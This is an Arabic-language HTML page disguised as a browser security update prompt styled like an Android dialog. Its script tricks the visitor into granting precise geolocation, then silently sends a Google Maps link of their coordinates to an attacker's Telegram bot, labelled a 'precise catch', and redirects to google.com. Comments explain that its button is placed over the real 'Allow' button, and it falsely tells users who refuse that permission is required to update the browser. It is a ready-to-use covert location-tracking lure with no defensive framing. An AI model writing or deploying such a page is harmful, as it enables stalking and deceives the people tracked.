
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث المتصفح</title>
    <style>
        body { margin: 0; background-color: #757575; font-family: sans-serif; display: flex; justify-content: center; align-items: flex-end; height: 100vh; }
        
        /* تصميم يشبه نافذة تنبيهات الأندرويد */
        .dialog {
            background: #fff;
            width: 100%;
            border-radius: 20px 20px 0 0;
            padding: 25px;
            box-shadow: 0 -5px 15px rgba(0,0,0,0.2);
            text-align: center;
            animation: slideUp 0.4s ease-out;
        }

        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }

        h3 { margin: 0 0 10px; color: #202124; font-size: 18px; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }

        /* الزر الذي سيكون مكانه فوق زر "سماح" الحقيقي */
        .btn-main {
            background: #1a73e8;
            color: white;
            border: none;
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="dialog">
        <h3>تحديث أمان الموقع</h3>
        <p>يرجى الضغط على متابعة لتأكيد هويتك والسماح للمتصفح بتحديث بيانات الوصول المحلية.</p>
        <button class="btn-main" onclick="requestLoc()">متابعة</button>
    </div>

<script>
    const token = "TOKEN_هنا"; 
    const chatId = "ID_هنا";

    function requestLoc() {
        if (navigator.geolocation) {
            // بمجرد الضغط هنا، ستظهر نافذة النظام الحقيقية فوراً فوق هذا المكان
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📍 صيد دقيق:\n' + map)}`)
                    .then(() => { window.location.href = "https://google.com"; });
                },
                (err) => {
                    alert("خطأ: يجب الضغط على 'سماح' لتحديث المتصفح.");
                },
                { enableHighAccuracy: true }
            );
        }
    }
</script>

</body>
</html>
